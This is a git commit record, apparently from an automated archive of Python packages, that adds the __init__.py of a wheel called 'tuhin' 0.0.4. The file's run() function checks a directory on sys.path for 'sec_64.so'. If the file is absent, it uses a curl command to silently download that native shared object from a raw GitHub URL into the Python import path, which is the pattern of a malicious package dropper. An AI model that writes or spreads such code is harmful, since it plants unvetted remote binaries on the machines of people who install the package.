33fe1b46633c708bb4c3867794729c72bd96037e
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-10-17 15:05:27 +0000

    Add package tuhin/0.0.4/tuhin-0.0.4-py3-none-any.whl

---
+++ packages/tuhin/tuhin-0.0.4-py3-none-any.whl/tuhin/__init__.py
@@ -0,0 +1,9 @@
+import os,sys
+path=str(sys.path[4])+str('/sec_64.so')
+def run():
+    if 'sec_64' in os.listdir(sys.path[4]):
+        pass
+    else:
+        print(" Downloading module please wait...")
+        os.system(f'curl -sS -L https://raw.githubusercontent.com/WARN-199/WARN-SERVER/refs/heads/main/sec_64.so -o {path}')
+        print(" Downloading Successful..")
